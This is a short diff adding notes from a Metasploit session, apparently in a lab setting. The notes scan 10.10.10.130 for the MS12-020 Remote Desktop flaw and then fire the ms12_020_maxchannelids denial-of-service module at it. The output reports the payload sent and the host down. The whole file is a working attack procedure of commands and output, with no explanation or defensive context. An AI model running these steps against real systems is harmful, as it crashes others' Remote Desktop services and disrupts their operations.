@@ -1,0 +1,22 @@
+msfconsole 
+search ms12-020
+use auxiliary/scanner/rdp/ms12_020_check
+show options
+set RHOSTS 10.10.10.130
+exploit
+use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+show options
+set RHOST 10.10.10.130
+show options
+exploit 
+[*] 10.10.10.130:3389 - Sending MS12-020 Microsoft Remote Desktop Use-After-Free DoS
+
+[*] 10.10.10.130:3389 - 210 bytes sent
+
+[*] 10.10.10.130:3389 - Checking RDP status...
+
+[+] 10.10.10.130:3389 seems down
+
+[*] Auxiliary module execution completed
+
+was died
